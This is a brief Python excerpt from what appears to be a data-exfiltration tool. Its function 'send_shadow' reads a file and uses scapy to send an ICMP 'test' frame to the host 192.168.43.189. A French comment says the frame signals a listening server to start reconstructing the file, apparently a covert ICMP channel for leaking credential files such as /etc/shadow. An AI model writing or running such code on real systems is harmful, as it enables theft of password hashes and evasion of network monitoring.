...
def send_shadow(filepath):
    with open(filepath) as fp:
        line = fp.readlines()
        test = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"test" # envoi d'une trame "test" pour bien vérifier que notre serveur ne commence l'écoute et reconstitution du fichier que quand il a la bonne trame de début
        scapy.send(test)
